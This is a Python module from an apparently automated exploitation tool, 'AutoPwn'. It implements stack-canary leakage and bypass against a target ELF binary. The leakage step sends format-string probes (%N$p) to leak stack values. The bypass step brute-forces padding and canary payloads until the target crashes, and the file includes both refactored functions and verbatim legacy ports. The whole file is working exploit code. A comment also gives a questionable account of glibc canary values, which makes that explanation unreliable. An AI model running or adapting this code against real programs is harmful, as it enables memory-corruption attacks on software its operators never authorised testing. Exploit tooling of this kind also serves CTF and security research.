"""AutoPwn detect layer: stack canary leakage + bypass (P5.3).

Replaces the v3.1 monolith's ``leakage_canary_value`` +
``canary_fuzz`` functions (see ``autopwn/_legacy.py`` L1277-1293 +
L1294-1441) with two typed entry points.  Per ``rebuild.md`` §6.6
P5.3 + ``refactor.md`` §5 mapping table, this is the third detect
module in the P5 layer (M2 milestone).

Public API
----------
* :func:`leakage_canary_value` — runs format-string probes
  ``%N$p`` for N in 0..max_offset-1 and returns the leaked
  values as a list of ``(offset, hex_string)`` pairs.
  Does **not** write to ``canary.txt`` (the legacy file
  artifact) — the data flows through the return value.
* :func:`canary_fuzz` — given a pre-computed leaks list and the
  target bit-width, fuzzes for the canary bypass (the offset
  ``c`` and padding diff ``diff``).  On success, builds a
  :class:`CanaryInfo` (value + diff) and writes it into
  ``ctx.canary``.  Returns the :class:`CanaryInfo` on success
  or ``None`` on failure.

Legacy ports (parity only)
--------------------------
* :func:`_legacy_leakage_canary_value` — verbatim port of v3.1's
  ``leakage_canary_value`` (L1277-1293).  Still writes the
  ``canary.txt`` file (v3.1's contract; ``_legacy_canary_fuzz``
  reads it back).  Has 1 caller (``_legacy.py`` L3225, in the
  canary branch).
* :func:`_legacy_canary_fuzz` — verbatim port of v3.1's
  ``canary_fuzz`` (L1294-1441).  Has 1 caller (``_legacy.py``
  L3226, immediately after leakage).  Still reads ``canary.txt``;
  couples with :func:`_legacy_leakage_canary_value` via the
  filesystem (v3.1 behavior, preserved for spec parity).

Design notes
------------
* The 2 public functions are **decoupled via parameter passing**
  (no filesystem side effect): ``canary_fuzz`` accepts ``leaks``
  as a list rather than reading ``canary.txt``.  The legacy
  ports preserve the v3.1 file-based contract for spec parity.
* The public function **mutates** ``ctx.canary`` (in-place) on
  success and returns the same :class:`CanaryInfo`.  On
  failure (``None``), ``ctx.canary`` is left untouched.
* The fuzzer in v3.1 has a long tail: 300 c-values × ~100 i
  × ~300 padding × ~2 processes per attempt → 18M+ process
  spawns in the worst case.  Both ``max_c`` and ``max_padding``
  parameters are exposed (default 300, matches v3.1) so unit
  tests can dial them down to 3-5 for tractability.
* The ``canary.txt`` file is preserved as a transitional
  artifact for the legacy port.  P8.5 (file deletion phase)
  will remove it once ``_legacy_canary_fuzz`` has zero callers.
"""
from __future__ import annotations

from pathlib import Path
from typing import List, Optional, Tuple

from autopwn.context import CanaryInfo, ExploitContext


# v3.1 L1316 + L1395: hex prefix used to identify canary candidates
# (stack canary values start with ``0x8`` in glibc — high bit set
# because the first byte is always 0x00, which becomes 0x80-ish after
# XOR with the cookie's lower bytes).
_CANARY_PREFIX = "0x8"

# v3.1 L1303: maximum number of format-string offsets to probe
DEFAULT_MAX_OFFSET = 100

# v3.1 L1320 + L1400: maximum parameter c and padding to test
DEFAULT_MAX_C = 300
DEFAULT_MAX_PADDING = 300


def leakage_canary_value(
    ctx: ExploitContext,
    program: Path,
    max_offset: int = DEFAULT_MAX_OFFSET,
) -> List[Tuple[int, str]]:
    """Probe the target binary for canary values via format-string leaks.

    Mirrors v3.1's ``leakage_canary_value`` (``_legacy.py``
    L1277-1293): for ``i`` in ``range(max_offset)``, spawns the
    binary, sends ``%{i}$p``, and captures the second line of
    output (the leaked value; the first line is the echo of the
    input).  Skips empty results (``EOFError`` or empty reply).

    Does **not** write to ``canary.txt`` — the leaked values are
    returned as a list of ``(offset, hex_string)`` tuples.  P8's
    orchestrator can then pass the list directly to
    :func:`canary_fuzz` without going through the filesystem.

    Note: v3.1's function sets ``context.binary = ELF(program)``
    as a side effect (so subsequent pwn calls in the same
    process auto-detect arch).  The public function **does not**
    do this — the public API is pwn-context-free.  The legacy
    port retains the side effect for spec parity.

    Args:
        ctx: the run's :class:`ExploitContext`.  Currently
            unused (read-only); reserved for future extensions
            (e.g. early-exit when ``ctx.binary.bit`` is 32 and
            the user wants a narrower probe range).
        program: path to the target ELF.
        max_offset: number of format-string offsets to probe
            (default 100, matches v3.1).  Probes 0..max_offset-1.

    Returns:
        A list of ``(offset, hex_string)`` tuples for every
        successful probe.  Order matches v3.1 (offset ascending).
        Empty list when the binary doesn't respond to any
        format-string probe.
    """
    from pwn import process  # local import — keeps module importable without pwn

    leaks: List[Tuple[int, str]] = []
    for i in range(max_offset):
        try:
            with process(str(program)) as p:
                p.sendline(f"%{i}$p".encode())
                p.recvline()
                result = p.recvline().decode().strip()
                if result:
                    leaks.append((i, result))
        except EOFError:
            pass
    return leaks


def canary_fuzz(
    ctx: ExploitContext,
    program: Path,
    bit: int,
    leaks: List[Tuple[int, str]],
    max_c: int = DEFAULT_MAX_C,
    max_padding: int = DEFAULT_MAX_PADDING,
) -> Optional[CanaryInfo]:
    """Fuzz for canary bypass using pre-computed format-string leaks.

    Mirrors v3.1's ``canary_fuzz`` (``_legacy.py`` L1294-1441):
    given a list of leaked values, tries every combination of
    ``c`` (format-string parameter), ``i`` (start index), and
    ``j`` (end index where a ``0x8*`` value sits) until a
    payload of ``char * padding + canary + test * diff``
    triggers SIGSEGV.

    On success, builds a :class:`CanaryInfo` (the canary's
    8-byte little-endian representation + the ``diff`` between
    the canary and the saved return address), writes it into
    ``ctx.canary`` (in-place), and returns it.  On failure
    (no SIGSEGV within ``max_c`` × ``max_padding`` attempts),
    returns ``None`` and leaves ``ctx.canary`` untouched.

    The 32-bit and 64-bit branches share most logic; the only
    differences are ``test = 'AAAA'`` vs ``'AAAAAAAA'`` and
    ``p32(result)`` vs ``p64(result)``.

    Args:
        ctx: the run's :class:`ExploitContext`.  ``ctx.canary``
            is **overwritten** with the discovered :class:`CanaryInfo`
            on success, left untouched on failure.
        program: path to the target ELF.
        bit: 32 or 64 — controls ``test`` length and pack width.
        leaks: list of ``(offset, hex_string)`` tuples from
            :func:`leakage_canary_value`.  May be ``[]`` (will
            short-circuit to ``None``).
        max_c: maximum number of format-string parameter values
            to test (default 300, matches v3.1).
        max_padding: maximum padding length to try before giving
            up on a single (c, diff) combination (default 300).

    Returns:
        A :class:`CanaryInfo` on success; ``None`` on failure.
    """
    from pwn import process, p32, p64, flat  # local import

    if not leaks:
        return None

    if bit == 64:
        char, test = "A", "AAAAAAAA"
        pack = p64
    else:  # bit == 32
        char, test = "A", "AAAA"
        pack = p32

    # v3.1 starts at i=1 (skipping leaks[0] = the %0$p probe result
    # which is the binary's own address, not a stack value).  Mirror.
    c = 1
    i = 1
    max_i = len(leaks)

    while c < max_c and i < max_i:
        # Walk j from i+1 looking for a 0x8* (likely canary) value
        for j in range(i + 1, max_i):
            if not leaks[j][1].startswith(_CANARY_PREFIX):
                continue
            diff = j - i
            found_j = True

            for padding in range(0, max_padding + 1):
                io = process(str(program))
                io.recv()
                io.sendline(f"%{c}$p".encode())
                result = io.recvline().decode().strip()

                if result.startswith("0x"):
                    result = int(result, 16)
                    packed = pack(result)
                else:
                    io.close()
                    continue

                input_data = flat([char * (padding + 1), packed, test * diff])
                io.recv()
                io.sendline(input_data)
                io.wait()

                if io.poll() == -11:  # SIGSEGV
                    canary_value = int(leaks[j][1], 16)
                    info = CanaryInfo(value=canary_value, diff=diff)
                    ctx.canary = info
                    io.close()
                    return info

                io.close()

            # Exhausted max_padding for this (c, diff) — try next c
            c += 1
            i += 1
            break  # break the inner j-loop; outer while advances c, i
        else:
            # for/else: j-loop ran to completion without finding 0x8*
            i += 1
            if i >= max_i:
                c += 1
                i = 0

    return None


# =====================================================================
# Legacy ports (parity only) — preserve v3.1's print_* output + file IO
# =====================================================================

def _legacy_leakage_canary_value(program: Path) -> None:
    """[OBSOLETE — prefer :func:`leakage_canary_value`] Verbatim port of v3.1's ``leakage_canary_value``.

    Retained for spec parity; has 1 caller (``_legacy.py`` L3225).
    Preserves the v3.1 file-based contract: writes the leaked
    values (one per line) to ``canary.txt`` in the cwd.  The
    subsequent :func:`_legacy_canary_fuzz` reads this file back
    (v3.1 L1310 + L1395: ``f.readlines()[1:]`` — skips the first
    line, which is ``%0$p`` from the very first probe).

    Side effects preserved from v3.1:
      * sets ``context.binary = ELF(program, checksec=False)``
        (L1278) so subsequent pwn calls auto-detect arch.
      * writes ``canary.txt`` (overwrites if exists).

    Returns:
        ``None`` (the leaks are written to ``canary.txt``).
    """
    from pwn import context, ELF, process

    elf = context.binary = ELF(str(program), checksec=False)
    with open("canary.txt", "w") as f:
        for i in range(100):
            try:
                with process(str(program)) as p:
                    p.sendline(f"%{i}$p".encode())
                    p.recvline()
                    result = p.recvline().decode().strip()
                    if result:
                        line = f"{result}\n"
                        f.write(line)
            except EOFError:
                pass


def _legacy_canary_fuzz(program: Path, bit: int):
    """[OBSOLETE — prefer :func:`canary_fuzz`] Verbatim port of v3.1's ``canary_fuzz``.

    Retained for spec parity; has 1 caller (``_legacy.py`` L3226).
    Preserves the v3.1 file-based contract: reads ``canary.txt``
    (written by :func:`_legacy_leakage_canary_value`), skips
    the first line, and fuzzes for the canary bypass.  Returns
    the same ``(padding, c, diff)`` tuple v3.1 did (or
    ``(None, None, None)`` on failure).

    Preserves v3.1 print behavior byte-for-byte:
    ``print_debug`` "canary: brute-force start, bit={bit}" +
    ``print_section_header`` "CANARY BYPASS FUZZING" +
    ``print_info`` "fuzzing for canary bypass" + (64-bit only)
    ``print_info`` "testing {N} canary values with {M} parameters" +
    per-attempt ``print_info`` "testing parameter c={c}, diff={diff}" +
    (32-bit only) ``print_info`` "Debug: c={c}, i={i}, padding={padding}, result={result}, diff={diff}" +
    ``print_success`` "canary bypass found! c={c}, padding={padding}, diff={diff}" +
    ``print_warning`` "parameter c={c} test failed, trying next parameter" +
    ``print_critical`` "All parameters tested, no valid offset found".

    Note: this legacy port does **not** write to ``ctx.canary``;
    it is a drop-in replacement for the v3.1 function whose
    return value the caller (``_legacy.py`` L3227) assigned to
    ``(padding, c, diff)``.

    Returns:
        ``(padding, c, diff)`` on success, or ``(None, None, None)``
        on failure.
    """
    from pwn import process, p32, p64, flat  # noqa: F401  (re-imported in body)

    from autopwn.core.logging import (
        print_debug, print_info, print_section_header, print_success,
        print_warning, print_critical,
    )

    print_debug(f"canary: brute-force start, bit={bit}")
    print_section_header("CANARY BYPASS FUZZING")
    print_info("fuzzing for canary bypass")

    if bit == 64:
        char = "A"
        test = "AAAAAAAA"
        with open("canary.txt", "r") as f:
            lines = [line.strip() for line in f.readlines()[1:]]

        c = 1
        i = 1
        max_c = 300
        max_i = len(lines)

        print_info(f"testing {max_i} canary values with {max_c} parameters")

        while c < max_c and i < max_i:
            current_line = lines[i]
            found_j = False
            exit_current = False
            for j in range(i + 1, max_i):
                if lines[j].startswith("0x8"):
                    diff = j - i
                    padding = 0
                    found_j = True

                    print_info(f"testing parameter c={c}, diff={diff}")

                    while padding <= 300:
                        io = process(str(program))
                        io.recv()
                        io.sendline(f"%{c}$p".encode())
                        result = io.recvline().decode().strip()

                        if result.startswith("0x"):
                            result = int(result, 16)
                            result = p64(result)

                        input_data = flat([char * (padding + 1), result, test * diff])
                        io.recv()
                        io.sendline(input_data)
                        io.wait()

                        if io.poll() == -11:
                            padding = padding + 1
                            print_success(
                                f"canary bypass found! c={c}, padding={padding}, diff={diff}"
                            )
                            return padding, c, diff

                        io.close()
                        padding += 1

                    if padding > 300:
                        print_warning(f"parameter c={c} test failed, trying next parameter")
                        c += 1
                        i += 1
                        exit_current = True
                        break
                    break

                if exit_current:
                    break

            if exit_current:
                continue

            if not found_j:
                i += 1
                if i >= max_i:
                    c += 1
                    i = 0

        print_critical("All parameters tested, no valid offset found")
        padding = None
        return padding, None, None

    # Similar logic for 32-bit
    if bit == 32:
        char = "A"
        test = "AAAA"
        with open("canary.txt", "r") as f:
            lines = [line.strip() for line in f.readlines()[1:]]

        c = 1
        i = 1
        max_c = 300
        max_i = len(lines)

        while c < max_c and i < max_i:
            current_line = lines[i]
            found_j = False
            exit_current = False
            for j in range(i + 1, max_i):
                if lines[j].startswith("0x8"):
                    diff = j - i
                    padding = 0
                    found_j = True

                    while padding <= 300:
                        io = process(str(program))
                        io.recv()
                        io.sendline(f"%{c}$p".encode())
                        result = io.recvline().decode().strip()
                        print_info(
                            f"Debug: c={c}, i={i}, padding={padding}, "
                            f"result={result}, diff={diff}"
                        )

                        if result.startswith("0x"):
                            result = int(result, 16)
                            result = p32(result)

                        input_data = flat([char * (padding + 1), result, test * diff])
                        io.recv()
                        io.sendline(input_data)
                        io.wait()

                        if io.poll() == -11:
                            padding = padding + 1
                            print_success(
                                f"canary bypass found! c={c}, padding={padding}, diff={diff}"
                            )
                            return padding, c, diff

                        io.close()
                        padding += 1

                    if padding > 300:
                        print_warning(f"c={c} test failed, trying next parameter")
                        c += 1
                        i += 1
                        exit_current = True
                        break
                    break

                if exit_current:
                    break

            if exit_current:
                continue

            if not found_j:
                i += 1
                if i >= max_i:
                    c += 1
                    i = 0

        print_critical("All parameters tested, no valid offset found")
        padding = None
        return padding, None, None


__all__ = [
    "leakage_canary_value",
    "canary_fuzz",
    "_legacy_leakage_canary_value",
    "_legacy_canary_fuzz",
]
